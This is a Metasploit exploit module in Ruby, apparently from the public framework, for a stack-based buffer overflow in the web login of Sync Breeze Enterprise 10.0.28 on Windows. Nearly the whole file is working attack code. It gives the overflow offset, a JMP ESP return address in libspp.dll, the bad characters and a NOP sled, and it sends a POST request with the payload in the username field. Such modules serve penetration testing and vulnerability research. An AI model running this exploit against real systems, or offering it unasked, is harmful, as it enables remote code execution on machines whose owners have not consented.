##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sync Breeze Enterprise POST Stack Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow vulnerability
        in the web interface of Sync Breeze Enterprise v10.0.28
        caused by improper bounds checking of the request in
        HTTP POST requests sent to the built-in web server. This
        module has been tested successfully on Windows 10 Pro 1709.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Werebug',
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'   => "\x00\x09\x0a\x0d\x20\x26",
          'Space'      => 1000
        },
      'Targets'        =>
        [
          [ 'Sync Breeze Enterprise 10.0.28',
            {
              'Offset' => 780,
              'Ret'    => 0x10090c83  # JMP ESP [libspp.dll]
            }
          ],
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0))
  end

  def exploit

    buffer = rand_text_alpha_upper(target['Offset'])
    buffer << [target['Ret']].pack('V')
    buffer << rand_text_alpha_upper(4)
    buffer << make_nops(16)
    buffer << payload.encoded

    send_request_cgi(
        'method' => 'POST',
        'uri'    => '/login',
        'vars_post'     => {
          'username' => "#{buffer}",
          'password' => "foo"
        }
    )
  end
end
